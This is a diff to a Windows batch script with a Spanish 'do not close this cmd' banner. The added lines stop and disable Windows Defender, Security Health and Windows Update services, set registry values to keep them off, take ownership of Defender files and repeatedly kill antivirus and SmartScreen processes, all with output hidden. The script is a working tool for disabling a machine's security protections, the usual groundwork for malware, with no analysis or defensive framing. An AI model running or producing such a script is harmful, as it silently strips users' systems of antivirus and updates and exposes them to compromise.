@@ -1,6 +1,32 @@
 @echo off
 echo no cerrar este cmd
 
+takeown /F "C:\Windows\System32\SecurityHealthService.exe" /A
+sc stop WinDefend >nul 2>&1
+sc stop SecurityHealthService >nul 2>&1
+sc config WinDefend start=disabled >nul 2>&1
+sc config SecurityHealthService start=disabled >nul 2>&1
+sc stop MsMpSvc >nul 2>&1
+sc config MsMpSvc start=disabled >nul 2>&1
+net stop wuauserv >nul 2>&1
+net stop UsoSvc >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\UsoSvc" /v "Start" /t REG_DWORD /d "4" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v "Start" /t REG_DWORD /d "4" /f
+taskkill /f /im SecurityHealthSystray.exe >nul 2>&1
+taskkill /f /im SecurityHealthHost.exe >nul 2>&1
+taskkill /f /im SecurityHealthService.exe >nul 2>&1
+taskkill /f /im MsMpEng.exe >nul 2>&1
+taskkill /f /im MpCmdRun.exe >nul 2>&1
+taskkill /f /im SecurityHealthSystray.exe >nul 2>&1
+taskkill /f /im SecurityHealthHost.exe >nul 2>&1
+taskkill /f /im SecurityHealthService.exe >nul 2>&1
+taskkill /f /im MsMpEng.exe >nul 2>&1
+taskkill /f /im MpCmdRun.exe >nul 2>&1
+taskkill /f /im smartscreen.exe >nul 2>&1
+taskkill /IM WmiApSrv.exe /F /T >nul 2>&1
+taskkill /IM MsMpEng.exe /F /T >nul 2>&1
+taskkill /IM MpCmdRun.exe /F /T >nul 2>&1
+
 takeown /F "C:\Program Files\Windows Defender" /R /A >nul 2>&1
 icacls "C:\Program Files\Windows Defender" /grant Administrators:F /T >nul 2>&1
 icacls "C:\Program Files\Windows Defender" /grant %USERNAME%:(F) /T >nul 2>&1
